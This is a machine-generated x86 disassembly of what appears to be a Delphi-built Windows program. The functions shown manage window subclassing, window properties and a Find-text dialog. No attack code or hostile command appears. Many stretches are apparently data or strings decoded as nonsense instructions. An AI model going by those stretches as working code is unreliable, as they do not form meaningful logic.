mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250ec
retn
sub_425100
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425125
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42512c
retn
sub_425138
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42515d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425164
retn
sub_425174
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edx + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
push ecx
inc edx
add [ edx + edx * 2 ] bl
inc edx
add [ eax ] bl
add [ eax ] al
sub al 0x21
inc ecx
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add al al
push esi
inc edx
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
push esi
inc edx
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ edi + ebx * 4 + 0x41 ] bl
add [ eax ] ch
sahf
inc ecx
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x561c0041 ] bl
inc edx
add [ edi + edx * 2 + 0x42 ] al
add [ eax - 0x6fffbdaa ] bl
push edi
inc edx
add [ ecx + ebp ] ch
inc eax
add [ 0x10000200 ] al
add [ edx - 0x11001100 ] eax
dec [ edi + edx * 2 + 0x42 ]
add [ edi + edx * 2 + 0x42 ] ah
add [ edi + edx * 2 + 0x42 ] bh
add [ eax + ebx * 2 + 0x42 ] ah
add [ eax + 0x58 ] bh
inc edx
add [ 0x6d6f4354 ] cl
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0xc08b676f
xor [ edx + 0x42 ] dl
add [ edi ] al
or eax 0x6d6f4354
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x51bc676f
inc edx
add [ eax ] ch
and al [ ecx ]
push es
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x473676f
add [ eax ] al
adc [ eax ] al
xor [ eax ] al
add bh bh
xor [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
add eax 0x336c7443
inc esp
hlt
sub_425500
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_450e2c
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_44d3cc
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_44d3cc
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_450b30
mov edi eax
mov eax ebx
call sub_450b14
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_450afc
mov edi eax
mov eax ebx
call sub_450b48
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_4255b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_425500
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_42561c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419b0c
mov [ esi + 0x30 ] 0x1
push esi
push sub_4256f8
call sub_41ab9c
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_425664
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419b58
test bl bl
jle r-xdata
call sub_41ac34
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_425698
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_453820
mov cl 0x1
sub_4256c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403328
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4256f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_425722
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425790
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_44a210
mov [ ebp - 0x14 ] eax
call sub_44a12c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_425853
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453110
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_425825
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42582c
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45316c
retn
sub_42582c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42585a
mov eax [ ebp - 0x14 ]
call sub_44a2c4
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_44a134
retn
sub_425890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ ecx + 0x42 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffa8004259 ]
pop ecx
inc edx
add [ eax ] dl
add al [ eax ]
add [ edi * 8 - 0x5d83ffbe ] cl
inc ecx
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add al ch
jl r-xdata
inc ebx
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax ] bh
mov [ 0xffffffff9f500043 ] al
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ esp + ebx * 2 ] dl
inc ebx
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
inc esp
cmp [ ebx ] al
pop eax
cmp eax [ ebx ]
add al 0x3a
inc ebx
add [ edx + ebx * 2 ] cl
inc edx
add ah al
pop esp
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add ah bl
popad
inc ebx
add [ eax + 0x68 ] dh
inc ebx
add [ eax ] dl
jbe r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
rcr [ edi + 0x43 ] 0x0
mov [ ebx + eax * 2 + 0x4374b000 ] ch
add [ esi + edi + 0x41 ] bl
add [ edx + ebx * 2 + 0x43 ] al
add [ eax + 0x2e ] al
inc ebx
add [ ecx + 0x43 ] ah
add [ eax + 0x37 ] bl
inc ebx
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x5e9c0041 ] bl
inc ebx
add [ edi - 0x5347ffbd ] bl
outsd
jb r-xdata
add al ch
pop ecx
inc edx
add al bh
jb r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_437b84
cmp [ ebx + 0xc ] 0x0
jne r-xdata
imul ebp [ esi + 0x64 ] 0xc08b776f
rcr [ ecx + 0x42 ] 0x0
pop es
mov eax eax
add [ eax ] ch
jno r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
inc edx
add [ edi ] al
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
push edi
imul ebp [ esi + 0x64 ] 0x58d8776f
inc edx
add al al
add [ ebx ] al
or eax [ eax ]
pop es
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_436ffc
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
imul esi [ edx + 0x65 ] 0x726f7463
add [ ebp + esi * 2 + 0x43 ] ah
add [ esi * 2 - 0x5e7bffbd ] cl
inc ebx
add [ edi + edi * 2 + 0x43 ] dl
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add al dh
mov al [ 0x10043 ]
and [ eax + sub_425a48 ] esi
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_425a50
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_425a8c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45457c
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_425a50
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4545a0
jmp r-xdata
push ebp
call sub_425a50
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45457c
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45457c
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4545a0
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_4545a0
jmp r-xdata
sub_425b40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_4255b4
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_425e00
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_425e4c
push eax
mov eax esi
call sub_425e00
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_425e4c
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_425a8c
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_425bc8
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42561c
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_425b40
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_425c72
add [ eax ] al
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40cb14
mov edx ebx
and dl 0xfc
mov eax esi
call sub_425664
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_425cc8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_430850
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_425d04
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_425b40
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_435e9c
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_425cc8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_43a170
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_425e18
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_425e64
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_425698
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_4032ec
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_4032ec
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_43a170
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_425f5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40436c
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_4082c8
pop esi
pop ebx
retn
sub_426024
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_4088c0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_4260bf
add [ edi ] cl
add [ eax ] al
add ah al
inc esi
add [ eax + 0x4675 ] ch
add [ eax ] al
add al al
inc esi
add [ eax ] dh
jns r-xdata
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + 0x75680046 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x27ffb999 ] bh
jpe r-xdata
jpo r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + 0x78e40046 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x17ffb999 ] ah
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + 0x79540046 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x43ffb999 ] dh
js r-xdata
or eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x46 ] bl
add [ eax + 0x78 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4261ca
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + 0x7b980046 ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x67 ] ch
inc esi
add [ esi + esi * 2 ] dl
inc esi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + 0x7a3c0046 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffb999 ] ch
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4261d1
retn
cmp [ rw-data ] 0x0
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x46 ] ah
add [ edx + edi * 2 + 0x46 ] bh
add [ eax ] al
pushad
inc esi
add [ eax ] dl
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
mov ecx 0xb
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_4261d4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403bfc
call sub_426024
mov eax [ r-xdata ]
call sub_41309c
mov eax [ r-xdata ]
call sub_41313c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4130e8
sub_426214
pushad
bound eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
bound eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
bound eax [ edx ]
cwde
bound eax [ edx ]
inc esp
add [ eax ] al
add [ ecx ] ch
inc ecx
add [ edx + 0x41 ] bh
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x6f300040 ] ah
inc edx
add [ eax + 0x3f ] al
inc ecx
add [ esi + ebx * 4 + 0x3e5c0041 ] al
inc ecx
add [ edi + ebx * 4 + 0x41 ] bl
add [ eax ] ch
sahf
inc ecx
add [ edi + ebx * 4 + 0x41 ] ch
add [ eax + 0x41 ] ah
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x6ee00041 ] bl
inc edx
add [ ecx ] al
add bh ch
jmp [ eax + 0x6004270 ]
sub_426299
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x62a49072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42626072
add [ eax ] ch
and al [ ecx ]
add eax 0x78450800
je r-xdata
dec ecx
outsb
je r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
call 0xffffffff8842a731
lodsb [ esi ]
inc ebx
add [ eax + 0x5c004374 ] dh
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4264 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x64 ] al
inc edx
add [ esp + 0x42 ] ch
add [ edx + eax ] ah
add [ eax ] al
call 0x7c42a655
mov [ 0x332c0041 ] al
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add al ch
jl r-xdata
insb
jae r-xdata
0xccff
add [ eax + 0x71 ] bh
inc edx
add al bh
jb r-xdata
add [ edx + ebx * 2 + 0x43 ] al
add [ eax + 0x2e ] al
inc ebx
add [ ecx + 0x43 ] ah
add [ eax + 0x37 ] bl
inc ebx
add [ edx - 0x6083ffbf ] dl
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x70b40041 ] bl
inc edx
add [ edi + 0x77080043 ] bl
inc ebx
add [ esi + edi + 0x41 ] bl
popad
insb
pushad
push cs
inc ecx
add [ eax ] bh
add [ eax ] al
dec [ eax + 0x1004270 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x42637472
add [ eax ] al
add [ eax ] al
inc edx
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax ] bh
mov [ 0xffffffff9f500043 ] al
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ esp + ebx * 2 ] dl
inc ebx
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
inc esp
cmp [ ebx ] al
pop eax
cmp eax [ ebx ]
add al 0x3a
inc ebx
add [ ebx + edi * 2 + 0x5cc40043 ] al
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add [ ebp + esi * 2 + 0x42 ] dh
add [ eax + 0x68 ] dh
inc ebx
add [ eax ] dl
jbe r-xdata
inc eax
add [ eax ] al
add bh bh
push 0x1004270
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
[ eax + 0x70 ]
inc edx
add [ eax ] ch
jno r-xdata
je r-xdata
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
inc eax
add [ eax ] dh
add [ eax ] al
je r-xdata
add [ edx + esi * 2 ] dl
inc edx
add [ eax ] ch
jb r-xdata
inc edx
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
lahf
insb
jae r-xdata
inc edx
add [ eax ] al
add ah cl
jne r-xdata
inc edx
add [ ebp + esi * 2 + 0x43 ] ah
add [ esi * 2 - 0x5e7bffbd ] cl
inc ebx
add [ eax ] bh
mov ebp 0x77340043
inc edx
add [ eax ] al
sahf
inc ebx
add al dh
mov al [ 0x73600043 ]
inc edx
add [ edi ] al
add [ ebx ] bh
mov al 0x12
mov al 0x10
mov al 0x32
mov al 0x47
add [ eax ] bh
mov al 0xca
dec esp
jno r-xdata
push esp
push eax
popad
outsb
insb
add [ eax + 0x71 ] bh
inc edx
add al bh
jb r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4265 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x28004265
add al [ eax ]
add [ eax ] ch
arpl [ edx ] ax
jl r-xdata
inc edx
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax ] bh
mov [ 0xffffffff9f500043 ] al
inc ecx
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx + 0x70b40041 ] bl
inc edx
add [ edi + 0x77080043 ] bl
add [ eax - 0x5bffbfd0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi * 2 + 0x42 ] ch
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
add [ ebx ] cl
add [ eax ] cl
add al ah
jno r-xdata
inc edx
add [ esp + 0x42 ] bh
add [ eax ] ch
jno r-xdata
push eax
popad
outsb
insb
lea eax [ eax ]
and [ edx + eax * 2 ] 0x7
or al 0x54
inc ebx
jne r-xdata
add [ ebx + esi ] ch
inc eax
add al dl
fwait
inc ecx
add [ ebx + esi ] dh
inc eax
add al ch
jl r-xdata
inc ecx
mov [ eax ] dh
inc eax
add [ eax + esi - 0x4317ffc0 ] ah
inc ebx
add [ eax - 0x4fffbc54 ] cl
je r-xdata
je r-xdata
jl r-xdata
inc ebx
inc ebp
js r-xdata
add al ch
jno r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
inc eax
in eax dx
inc edx
add [ ecx ] ah
add bh bh
les ebp [ ebx + eax * 2 ]
add [ eax + 0x2d ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
add [ edx ] al
or [ ebp + 0x78 ] al
je r-xdata
inc edx
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
inc ecx
je r-xdata
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ esp + ebx * 2 ] dl
inc ebx
